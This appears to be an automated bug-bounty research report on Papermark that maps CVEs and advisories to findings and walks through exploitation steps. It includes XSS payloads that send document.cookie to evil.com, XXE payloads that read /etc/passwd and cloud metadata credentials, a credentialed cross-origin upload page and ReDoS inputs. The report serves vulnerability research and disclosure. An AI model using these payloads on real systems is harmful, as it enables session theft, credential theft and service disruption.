# Web Search SAST Results — papermark bug bounty

**Node:** Layer-3 SAST Web Research (light tier, live web)
**Date:** 2026-06-30
**Inputs:** `03-web-search-strategy.md`, `02-synthesized-sast.md`
**Searches Executed:** 24 queries (14 planned SAST + 10 supplementary)

---

## CVEs

| CVE ID | Affected Package | Version | CVSS | Applies To | Notes |
|--------|-----------------|---------|------|-----------|-------|
| **CVE-2026-44990** | `sanitize-html` | < 2.17.4 | **9.3 CRITICAL** | S-002 | `<xmp>` raw-text element bypass allows arbitrary HTML/JS injection even under default config. `sanitize-html` fails to include `<xmp>` in its `nonTextTags` list, so inner content passes through unescaped. Papermark uses 2.17.3. |
| **CVE-2026-40186** | `sanitize-html` (via ApostropheCMS) | 2.17.1–2.17.2 | 6.1 MEDIUM | S-002 | Entity-decoding regression in `nonTextTagsArray` (`<option>`, `<textarea>`). htmlparser2 v10.x decodes entities before passing to `ontext`, but code skips `escapeHtml()`. Papermark on 2.17.3 is patched for this specific CVE but vulnerable to CVE-2026-44990. |
| **CVE-2026-23864** | Next.js (RSC) | 14.x (EOL, no fix) | **7.5 HIGH** | S-004 | Memory exhaustion during RSC deserialization. No fix for v14 (EOL Oct 2025). Papermark on 14.2.35. |
| **CVE-2026-23869** | Next.js (RSC) | 14.x (EOL, no fix) | **7.5 HIGH** | S-004 | CPU exhaustion via cyclic deserialization. Same EOL status. |
| **CVE-2026-44574** | Next.js | < 15.5.16, < 16.2.5 | HIGH | S-001 (context) | Middleware/proxy bypass via dynamic route parameter injection. Query params alter dynamic route value seen by page, bypassing middleware checks. |
| **CVE-2026-44575** | Next.js | >= 15.2.0 < 15.5.16, >= 16.0.0 < 16.2.5 | HIGH | S-001 (context) | Middleware bypass via `.rsc` and segment-prefetch URL variants that resolve to the same page without matching middleware rules. |
| **CVE-2025-29927** | Next.js | 11.1.4–14.2.25, 15.0.0–15.2.3 | **9.1 CRITICAL** | S-001 (context) | Middleware bypass via `x-middleware-subrequest` header spoofing. Papermark on 14.2.35 may be patched but the pattern is instructive: middleware is not a reliable auth boundary. |
| **CVE-2026-46339** | 9router (Next.js app) | >= 0.4.30, < 0.4.37 | **10.0 CRITICAL** | S-001 (pattern) | Unauthenticated RCE via unprotected catch-all routes. Middleware `matcher` only listed 8 explicit routes; 40+ routes under `/api/cli-tools/*` were unprotected. Directly analogous to papermark's conversations route issue. |
| **CVE-2026-44578** | Next.js | 13.4.13–15.5.16, 16.x–16.2.5 | HIGH | S-004 (context) | SSRF via WebSocket Upgrade requests — attacker forces server to make outbound requests to internal systems. |
| **CVE-2026-57957** | Papermark | <= 0.22.0 | **4.7 MEDIUM** | S-005 | CORS origin reflection on TUS viewer upload endpoint with `Access-Control-Allow-Credentials: true`. Papermark's own CVE — confirms S-005 is a live, filed vulnerability. Fixed in 0.23.0. |
| **CVE-2026-30925** | Parse Server (LiveQuery) | Unpatched | HIGH | S-013 (context) | `$regex` in LiveQuery subscriptions causes catastrophic backtracking. Local event loop blocked. |
| **CVE-2026-27903/4/6** | minimatch | Various | HIGH | S-013 (context) | Multiple ReDoS CVEs via GLOBSTAR segments and nested extglobs. Demonstrates ReDoS as an active CVE class in Node.js. |
| **CVE-2026-55375** | canto-saas-api | Moderate | MEDIUM | S-008 | OAuth credentials exposed in URL query string — same pattern as revalidation secret in query parameter. |
| **GHSA-rmwh-g367-mj4x** | File Browser | v2.32.0 | 4.5 MEDIUM | S-008 | JWT leaked via `?auth=` in URL — same query-param secret leakage pattern. |

### CVE-2026-44990 — Critical Detail

The `<xmp>` bypass works because:
1. Default `nonTextTags` in `sanitize-html` index.js lists: `script`, `style`, `textarea`, `option` — **NOT `xmp`**
2. `ontext` handler (lines 569–577) special-cases both `textarea` and `xmp`, appending content **unescaped**
3. `htmlparser2` treats `<xmp>` as raw-text element → markup inside is parsed as text on input but becomes live markup when appended unescaped to output

PoC:
```js
sanitizeHtml('<xmp><script>alert(1)</script></xmp>');
// Output: <script>alert(1)</script>
```

---

## Bug-Bounty Writeups

### Critical Pattern: Missing Auth on API Routes

| URL | Pattern | Similar To | Takeaway |
|-----|---------|-----------|----------|
| https://github.com/advisories/GHSA-fhh6-4qxv-rpqj | Catch-all routes unprotected by middleware matcher | **S-001** (conversations) | 9router had 40+ routes under `/api/cli-tools/*` and `/api/mcp/*` missing from matcher — attacker registered malicious plugin via unprotected POST, then triggered RCE via GET. Exact structural analogue to conversations route gap. |
| https://huntr.com/bounties/301f53c6-fcac-47f9-93cf-49e09f302e29 | Unauthenticated SQL execution via editor endpoints | **S-001, S-006, S-007** | DB-GPT v1 POST endpoints (`/api/v1/editor/sql/run`) had zero auth — no API key, session, or token check. CORS was `*`. Write operations executed via bare `@router.post()` with no `Depends(check_api_key)`. |
| https://github.com/advisories/GHSA-j542-4rch-8hwf | Mass assignment on onboarding → JWT_SECRET overwrite | **S-001** (unauthenticated writes) | Hoppscotch CVE-2026-50160 (CVSS 10.0): `POST /v1/onboarding/config` allowed unauthenticated injection of `JWT_SECRET` via missing `whitelist: true` + `Object.entries(dto)` iteration with `default: break`. |
| https://github.com/BiiTts/CVE-2026-56782-Gorse-Auth-Bypass | Unauthenticated DB dump/restore via fail-open auth | **S-001, S-006** | Gorse < 0.5.10 — `checkAdmin()` returns `true` when `admin_api_key` is empty (default). Single GET dumps full PostgreSQL DB; POST overwrites it. |
| https://advisories.gitlab.com/npm/@budibase/server/CVE-2026-50137/ | Unauthenticated S3 pre-signed URL minting | **S-003** (token generation) | Budibase: `POST /api/attachments/:datasourceId/url` had no `authorized()` middleware. Anonymous callers could mint S3 PUT pre-signed URLs using stored IAM credentials. Same pattern as progress-token.ts. |
| https://github.com/openrijal/traktdb/issues/12 | Unauthenticated resource consumption + CSRF risks | **S-006, S-007** | Multiple API endpoints missing auth — direct DB writes with no session validation. |

### XSS via Sanitizer Bypass

| URL | Pattern | Similar To | Takeaway |
|-----|---------|-----------|----------|
| https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9mrh-v2v3-xpfm | sanitize-html allowedTags bypass via entity-decoded text | **S-002** | CVE-2026-40186: regression in nonTextTagsArray — `<option>` and `<textarea>` entity-decoded text bypasses `allowedTags`. htmlparser2 v10.x decodes entities before `ontext`, but code skips `escapeHtml()`. |
| https://dev.to/ryangombe/solving-the-cors-vulnerability-lab-basic-origin-reflection-589c | Origin reflection CORS → XSS data exfiltration | **S-005** (CORS) | PortSwigger lab walkthrough: reflecting arbitrary Origin with Credentials:true allows JS on attacker page to exfiltrate responses. |
| https://armur.ai/xss-attacks/preventions/preventions/advanced-xss-techniques/ | Framework-specific XSS and polyglot payloads | **S-002, S-009, S-010** | Advanced XSS techniques including context-aware payloads for `dangerouslySetInnerHTML` sinks in React. |
| https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html | React XSS: Why dangerouslySetInnerHTML remains the top sink | **S-002, S-009, S-010** | 2025 analysis: despite React's design, `dangerouslySetInnerHTML` is the #1 XSS vector in React apps. New JS injection techniques bypass framework protections. |

### CORS + CSRF File Upload

| URL | Pattern | Similar To | Takeaway |
|-----|---------|-----------|----------|
| https://github.com/advisories/GHSA-rhf7-wvw3-vjvm | Cross-origin arbitrary file write via missing CSRF + wildcard CORS | **S-005** | goshs CVE-2026-42091: PUT handler lacked CSRF validation (while POST had it). OPTIONS returned `Access-Control-Allow-Origin: *`. Any website could write files to webroot through victim's browser. |
| https://cvetodo.com/cve/CVE-2026-57957 | Papermark CORS origin reflection on TUS endpoint | **S-005** | Papermark's own CVE — confirms S-005. Fixed in 0.23.0. CVSS 4.7. |
| https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack | CORS origin reflection with credentials → data exfiltration | **S-005** | Canonical PortSwigger lab: basic origin reflection + `withCredentials = true` → API key exfiltration via redirect to attacker log. |
| https://vibe-eval.com/patterns/cors-credentials-misconfig/ | CORS = * with credentials = true — CSRF protection voided | **S-005** | "If your CORS policy says any origin can call your API and your cookies say any origin can carry them, you have built a CSRF vending machine." |

### Information Disclosure

| URL | Pattern | Similar To | Takeaway |
|-----|---------|-----------|----------|
| https://dev.to/cverports/ghsa-7ppg-37fh-vcr6-vector-injection-no-just-regular-injection-milvus-critical-auth-bypass-1ml9 | Auth bypass on Milvus management API with default token | **S-001, S-006** | Port 9091 exposed with `auth=by-dev` default. Missing authentication allows data modification (CWE-306). |

### Token/Secret in Query Parameters

| URL | Pattern | Similar To | Takeaway |
|-----|---------|-----------|----------|
| https://github.com/advisories/GHSA-37pm-83g7-r22v | API token exposed in URL query param and server logs | **S-008** | OpenCastor ISSUE #565: `?token=` in URL is logged by uvicorn/nginx, persisted in browser history, leaked via Referer header. |
| https://osv.dev/vulnerability/GHSA-rmwh-g367-mj4x | JWT accepted in query string (CWE-598) | **S-008** | File Browser: `?auth=...` in download and WebSocket URLs leaked JWT — full account access. |
| https://advisories.gitlab.com/composer/jleehr/canto-saas-api/CVE-2026-55375/ | OAuth credentials exposed in URL query string | **S-008** | CVE-2026-55375: `app_secret`, `refresh_token`, `code` sent as URL query params of POST requests. |

### ReDoS

| URL | Pattern | Similar To | Takeaway |
|-----|---------|-----------|----------|
| https://github.com/advisories/GHSA-mf3j-86qx-cq5j | ReDoS via `$regex` in Parse Server LiveQuery | **S-013** | CVE-2026-30925: user-supplied regex evaluated in Node.js (not DB). Catastrophic backtracking blocks event loop. Fix: VM-isolated regex with 100ms timeout. |
| https://huntr.com/bounties/e32f5f0d-bd46-4268-b6b1-619e07c6fda3 | ReDoS via regex in model-mapping conditions ($450 bounty) | **S-013** | Lunary AI: users upload custom regex patterns → attacker submits `^(a+)+$` with matching long input → exponential backtracking. Directly analogous to workflow engine regex injection. |

---

## Exploitation Techniques

### Technique 1: Middleware Matcher Gap → Full API Access

**Applies to:** S-001 (conversations CRITICAL), S-003 (progress-token HIGH)

**Step-by-step:**
1. **Recon** — Identify the middleware configuration. In Next.js, check `middleware.ts` for `matcher` array. Look for `/api` exclusions or narrow matchers.
   ```typescript
   // Middleware that explicitly excludes /api/ from auth
   export const config = { matcher: ["/((?!api/.*).*)"], }; // or similar exclusion
   ```
2. **Enumerate unprotected endpoints** — Fuzz for `/api/` endpoints, especially catch-all routes (`[[...param]].ts`), webhook handlers, and utility endpoints.
3. **Test with no auth** — Directly call the discovered endpoint with `curl` — no session cookie, no Authorization header, no API key.
4. **For authenticated-only operations** (like DB writes), check if the endpoint accepts identifiers from query params/body without server-side ownership verification:
   ```bash
   curl -X POST https://target.com/api/conversations \
     -H "Content-Type: application/json" \
     -d '{"dataroomId": "any-id", "viewerId": "any-id", "message": "test"}'
   ```
5. **Verify write persistence** — If the endpoint creates DB records, confirm they persist by re-fetching with different parameters.

**Mechanism:** Middleware in Next.js is a per-request filter, not a router-level guard. When the `matcher` excludes `/api/`, ALL API routes are reachable without middleware running. Individual route handlers must implement their own auth — but often don't, especially in catch-all routes added during later development phases.

---

### Technique 2: Stored XSS via Sanitizer Entity-Decode Ordering

**Applies to:** S-002 (stored XSS HIGH)

**Step-by-step:**
1. **Identify the sanitize entry points** — Look for functions that call `sanitizeHtml` followed by `decodeHTML` (or similar `he.decode` / `entities.decode`):
   ```typescript
   // BUG: decode AFTER strip
   const sanitized = sanitizeHtml(input, config);  // Step 1: strip tags
   const decoded = decodeHTML(sanitized);            // Step 2: decode entities — TOO LATE
   ```
2. **Craft payload** — Encode HTML tags as HTML entities. Since entities are not literal tags, the sanitizer's tag stripping passes them through:
   ```json
   {"name": "&lt;img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)&gt;"}
   ```
3. **Submit through an authenticated write path** — Document rename, team name update, agreement creation, FAQ content update.
4. **Confirm storage** — The decoded payload is now stored in the database (PostgreSQL `Document.name` or similar).
5. **Wait for XSS trigger** — When any team member views the document page, `dangerouslySetInnerHTML` renders the stored name. The XSS fires in their browser context, enabling session token theft.

**Chaining enhancement:** Combine with `<xmp>` bypass (CVE-2026-44990) for an even simpler payload that doesn't require entity encoding:
```json
{"name": "<xmp><img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)></xmp>"}
```

The `<xmp>` tag is a raw-text element — `sanitize-html` 2.17.3 passes its content through unescaped because `<xmp>` is not in the `nonTextTags` list. No entity encoding needed.

---

### Technique 3: Unauthenticated Trigger.dev Public Access Token Generation

**Applies to:** S-003 (progress-token HIGH)

**Step-by-step:**
1. **Locate the endpoint** — Find `GET /api/progress-token?documentVersionId=<cuid>`. The endpoint calls `generateTriggerPublicAccessToken(\`version:${documentVersionId}\`)`.
2. **Obtain a valid `documentVersionId`** — CUIDs are not trivially guessable, but can be leaked through:
   - Client-side JavaScript bundles (Next.js serializes server props)
   - Referrer headers from document pages
   - Browser history/developer tools Network tab
   - Server-side error messages that leak IDs
   - Log files (if accessible)
3. **Request the token**:
   ```bash
   curl -s "https://target.com/api/progress-token?documentVersionId=clx...abc123"
   ```
   Response: `{"publicAccessToken": "tr_..."}`
4. **Use the token** — The Trigger.dev public access token (15-minute expiry) grants read access to runs tagged with `version:{documentVersionId}`:
   ```bash
   curl -H "Authorization: Bearer tr_..." \
     "https://api.trigger.dev/api/v1/runs?tag=version:clx...abc123"
   ```
5. **Extract information** — View run metadata, processing status, error messages, and potentially sensitive data flowing through workflow runs.

**The critical weakness:** The endpoint generates tokens for ANY `documentVersionId` with zero authentication. Compare with the three authenticated EE routes that call the same function (monitor-token, retry-archive, freeze) — all behind NextAuth session checks. This endpoint is the only unguarded path.

---

### Technique 4: CORS Origin Reflection + Credentials → Cross-Origin File Upload

**Applies to:** S-005 (TUS CORS MEDIUM)

**Step-by-step:**
1. **Verify the CORS misconfiguration** — Send an OPTIONS preflight with a crafted Origin:
   ```bash
   curl -X OPTIONS "https://target.com/api/file/tus-viewer/..." \
     -H "Origin: https://attacker.com" \
     -H "Access-Control-Request-Method: POST"
   ```
   If the response includes:
   ```
   Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Credentials: true
   ```
   The endpoint is vulnerable.

2. **Craft the attacker page** — Create an HTML page that silently issues credentialed requests:
   ```html
   <html><body>
   <script>
   // TUS upload requires specialized JS (tus-js-client)
   // But the key is: withCredentials works cross-origin due to CORS config
   var xhr = new XMLHttpRequest();
   xhr.open('POST', 'https://target.com/api/file/tus-viewer/upload', true);
   xhr.withCredentials = true;
   xhr.setRequestHeader('Upload-Length', '...');
   xhr.setRequestHeader('Upload-Metadata', '...');
   xhr.send(upload_data);
   </script>
   </body></html>
   ```

3. **Host and deliver** — Host the page on attacker.com and deliver to the victim (phishing, social engineering, or XSS chaining).

4. **Victim trigger** — When an authenticated papermark user visits the page, the browser automatically includes session cookies in the cross-origin request due to `Access-Control-Allow-Credentials: true`.

5. **Upload files to victim's dataroom** — The attacker can upload arbitrary files into the victim's datarooms, leveraging the victim's authenticated session.

6. **Response exfiltration** (if responses are readable from JS) — The attacker can also read response data, potentially leaking document IDs, viewer information, or internal state.

**Cooldown factor:** `SameSite=Strict` cookies would block this attack. If papermark uses `SameSite=Lax` or `None` for session cookies, this exploit works.

---

### Technique 5: XXE via Crafted DOCX in Document Conversion Pipeline

**Applies to:** S-012 (XXE docx-sanitizer MEDIUM)

**Step-by-step:**
1. **Create a malicious DOCX** — DOCX is a ZIP archive containing XML files. Unzip a legitimate DOCX and modify the XML:
   ```bash
   mkdir -p /tmp/xxe-docx
   cd /tmp/xxe-docx
   unzip /path/to/template.docx -d /tmp/xxe-docx
   ```

2. **Inject XXE payload** — Modify `word/document.xml` or `[Content_Types].xml` to include an XXE:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <w:document xmlns:w="...">
     <w:body>
       <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
     </w:body>
   </w:document>
   ```

3. **Repackage the DOCX**:
   ```bash
   cd /tmp/xxe-docx && zip -r /tmp/malicious.docx *
   ```

4. **Upload the malicious DOCX** through an authenticated document upload endpoint.

5. **Trigger the conversion pipeline** — When the server processes the upload:
   - The Python subprocess extracts the DOCX
   - `docx-sanitizer.py` parses the XML with `xml.etree.ElementTree.parse()`
   - Because `defusedxml` is not used, external entities are resolved
   - `/etc/passwd` content is read and potentially included in parsed output

6. **Extend to SSRF** — Use the same technique to reach internal services:
   ```xml
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
   ```

**Limitations:** Requires an authenticated upload (not internet-facing). The Python process runs as a subprocess during document conversion and has no network-level sandboxing, making SSRF viable.

**Mitigation research:** Multiple projects have been hit by this exact pattern. Microsoft Markitdown (GitHub issue #1565) had the same vulnerability with `ET.fromstring()` on untrusted DOCX OMML XML. The fix is replacing `xml.etree.ElementTree` with `defusedxml.ElementTree` or calling `defusedxml.defuse_stdlib()`.

---

### Technique 6: Query Parameter Secret Leakage via Server Logs and Referrer

**Applies to:** S-008 (revalidate MEDIUM)

**Step-by-step:**
1. **Observe the pattern** — The revalidation endpoint authenticates via `req.query.secret !== process.env.REVALIDATE_TOKEN`.
2. **Identify leakage vectors**:
   - **Server access logs** — Every request to `/api/revalidate?secret=XXXX` is logged verbatim by nginx, Apache, Vercel, CDNs, load balancers. If any of these logs are compromised (or aggregated into a SIEM accessible to insiders), the secret is exposed.
   - **Referer header** — If the revalidation response loads any external resources (images, scripts, fonts), the full URL including `secret=XXXX` is sent as the `Referer` header to those origins.
   - **Browser history** — If triggered from a browser, the URL is stored in history.
3. **Exploit with leaked secret** — Once the `REVALIDATE_TOKEN` is obtained, an attacker can:
   - Force mass revalidation of all team links (DoS via revalidation cache stampede)
   - Enumerate which links exist for a given team/document by observing response differences
   - Trigger repeated revalidation for monitoring/analytics manipulation

**Better pattern:** Send the secret in a request header (`X-Revalidate-Token`) rather than a query parameter. Use a POST body for the secret value.

---

### Technique 7: ReDoS via Non-Literal RegExp in Workflow Conditions

**Applies to:** S-013 (workflow ReDoS LOW)

**Step-by-step:**
1. **Identify the vulnerable pattern** — The workflow engine creates a `RegExp` from user-controlled `condition.value`:
   ```typescript
   case "matches":
     return new RegExp(condition.value as string).test(normalizedEmail);
   ```
2. **Submit a malicious regex pattern** — If the user can configure workflow routing rules, submit an exponential-time regex:
   ```
   ^(a+)+$
   ```
3. **Trigger with matching input** — Route an email or data that triggers the condition with a crafted input like `"aaaaaaaaaaaaaaaaaaaaac"`. The regex engine backtracks exponentially.
4. **Result** — For ~20 `a` characters, the backtracking takes seconds. For ~30+, the event loop blocks for minutes, starving all other requests.
5. **Recurring DoS** — If the workflow engine evaluates conditions on every matching event, a single ReDoS workflow can degrade the service continuously.

**Historical writeups:** CVE-2026-30925 (Parse Server LiveQuery) — same pattern: user-supplied `$regex` evaluated in Node.js event loop. Fix was VM-isolated execution with 100ms timeout. Hunts for Lunary AI paid $450 bounty for a similar ReDoS via model-mapping regex.

**Cooldown factor:** This is caught by try/catch in the papermark code (`try { ... } catch { return false; }`), but the catch only runs AFTER the backtracking completes. The ReDoS still blocks the event loop during execution.

---

### Technique 8: Zod Validation Error Format — Schema Information Disclosure

**Applies to:** S-010 (Zod info disclosure MEDIUM)

**Step-by-step:**
1. **Send malformed requests** — To any endpoint that returns `validationResult.error.format()`:
   ```bash
   curl -X POST "https://target.com/api/webhooks/services/..." \
     -H "Content-Type: application/json" \
     -d '{"invalid": "data"}'
   ```
2. **Read the error response** — The response will contain:
   ```json
   {
     "error": "Invalid request body",
     "details": {
       "_errors": [],
       "field1": { "_errors": ["Required"] },
       "field2": { "_errors": ["Expected string, received number"], "nested": { ... } }
     }
   }
   ```
3. **Enumerate the schema** — Each error response progressively reveals:
   - Field names and types
   - Which fields are required vs optional
   - Validation constraints (min, max, regex patterns from `.regex()`)
   - Union/discriminated union branches
   - Nested object structures
4. **Use schema knowledge** — Attackers use this to:
   - Target specific fields for injection
   - Understand enum values
   - Craft requests that pass validation but bypass business logic
   - Map the internal API surface without source access

---

### Technique 9: ReDoS via User-Supplied Regex in AI/Workflow Config (Bug Bounty Pattern)

**Applies to:** S-013

**Step-by-step (from lunary-ai $450 bounty):**
1. An application allows users to upload custom model-mapping regex patterns
2. Attacker submits an exponential-time pattern: `^(a+)+$`
3. Attacker submits matching input: `"aaa...aac"` (long repeating string with fail at end)
4. Node.js event loop blocks for the duration of backtracking
5. Server becomes unresponsive to other requests during backtracking

**Fix pattern used by Parse Server:** Isolate regex in VM context with timeout (`liveQuery.regexTimeout`, default 100ms).
